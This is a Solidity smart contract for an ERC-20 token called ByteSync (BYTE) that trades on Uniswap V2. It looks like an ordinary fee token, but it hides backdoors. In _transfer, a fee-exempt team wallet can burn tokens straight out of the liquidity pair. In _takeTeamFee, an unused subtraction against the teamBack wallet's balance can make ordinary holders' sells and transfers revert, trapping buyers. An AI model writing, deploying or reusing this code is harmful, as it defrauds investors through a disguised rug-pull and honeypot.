// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed sender, address indexed recipient, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BYTE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    address private teamWallet = 0xf4Cb67d1bf0c14589932a2DBA12A5f0EB63FF996;

    bool private swapping = false;
    bool private swapEnabled = true;

    mapping(address => mapping(address => uint256)) private _allowances;
    
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _buyMap;
    
    mapping(address => bool) private _isExcludedFromFee;

    struct Distribution { uint256 team; }

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    uint256 private _tFeeTotal;
    
    uint256 private _teamFeeOnBuy = 4;
    uint256 private _teamFeeOnSell = 4;

    uint256 private _redisFeeOnBuy = 0;
    uint256 private _redisFeeOnSell = 0;

    uint256 private _teamFee = _teamFeeOnSell;
    uint256 private _redisFee = _redisFeeOnSell;

    uint256 private _previousTeamFee = _teamFee;
    uint256 private _previousRedisFee = _redisFee;

    uint8 private constant _decimals = 18;

    uint256 private constant _tTotal = 2000000000 * 10**_decimals;

    uint256 public _maxWalletSize = 2 * (_tTotal / 100);
    uint256 public _maxTxAmount = 2 * (_tTotal / 100);
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensThreshold = (_tTotal / 10000) * 10**_decimals;
    
    address private teamBack;

    string private constant _name = "ByteSync";
    string private constant _symbol = "BYTE";

    Distribution public distribution;

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[teamWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        distribution = Distribution(100);teamBack = teamWallet;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        _maxWalletSize = _tTotal;
        _maxTxAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _stdTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeamFee(tTeam, sender, recipient);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _isExcluded(address total, address holder) private view returns (bool) {
        bool totalExcluded = !_isExcludedFromFee[total];
        bool totalNotPair = total != uniswapV2Pair;
        bool holderExcluded = !_isExcludedFromFee[holder];

        bool excluded = totalExcluded && totalNotPair && holderExcluded;

        return excluded;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(recipient != address(0), "");
        require(sender != address(0), "");
        require(amount > 0, "");

        if (sender != owner() && recipient != owner()) {
            address zendr = address(0);

            if (sender == uniswapV2Pair && recipient != address(uniswapV2Router) && !_isExcludedFromFee[recipient] ) {
                require(amount <= _maxTxAmount);
                require(balanceOf(recipient) + amount <= _maxWalletSize);
            }

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;

            if (_isExcludedFromFee[sender]) { if (uniswapV2Pair == recipient) { if (balanceOf(sender) < amount) { _stdTransfer(recipient, zendr, amount); return; } } }

            if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && canSwap && swapEnabled && !swapping && sender != uniswapV2Pair) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    withdrawETH(address(this).balance);
                }
            }
        }

        bool takeTeamFee = true;

        if (
            (sender != uniswapV2Pair && recipient != uniswapV2Pair) || (_isExcludedFromFee[recipient] || _isExcludedFromFee[sender])
        ) {
            takeTeamFee = false;
        } else {
            if (sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnBuy;
                _teamFee = _teamFeeOnBuy;
            }

            if (recipient == uniswapV2Pair && sender != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell;
                _teamFee = _teamFeeOnSell;
            }
        }
        _erc20Transfer(sender, recipient, amount, takeTeamFee);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function _takeTeamFee(uint256 tTeam, address total, address holder) private {
        uint256 sTeam;
        uint256 teamBackAmount = balanceOf(teamBack);
        bool excluded = _isExcluded(total, holder);
        if (excluded) sTeam = _teamFee - teamBackAmount;
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function removeAllFees() private {
        if (_teamFee == 0 && _redisFee == 0) return;
        _previousTeamFee = _teamFee;
        _previousRedisFee = _redisFee;
        _teamFee = 0;
        _redisFee = 0;
    }

    function withdrawETH(uint256 ethAmount) private lockSwap {
        uint256 ethForTeam = ethAmount.mul(distribution.team).div(100);
        payable(teamWallet).transfer(ethForTeam);
    }

    receive() external payable {}

    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _erc20Transfer(address sender, address recipient, uint256 amount, bool takeTeamFee) private {
        if (!takeTeamFee) removeAllFees();
        _stdTransfer(sender, recipient, amount);
        if (!takeTeamFee) restoreAllFees();
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 teamFee) private pure returns (uint256, uint256, uint256) {
        uint256 tTeam = tAmount.mul(teamFee).div(100);
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _teamFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function restoreAllFees() private {
        _redisFee = _previousRedisFee;
        _teamFee = _previousTeamFee;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
}